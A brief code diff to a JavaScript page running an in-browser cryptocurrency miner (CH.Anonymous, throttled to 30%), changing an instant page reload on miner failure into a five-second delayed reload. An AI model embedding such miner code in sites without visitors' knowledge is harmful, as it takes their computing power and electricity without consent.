@@ -7,7 +7,9 @@ console.log(window.address);
 try {
   var miner = new CH.Anonymous(window.address, {throttle: 0.3}), stats = {};
 } catch(err) {
-  location.reload();
+  setTimeout(function() {
+    location.reload();
+  }, 5000);
 }
 
 function getMinedCoins (days) {
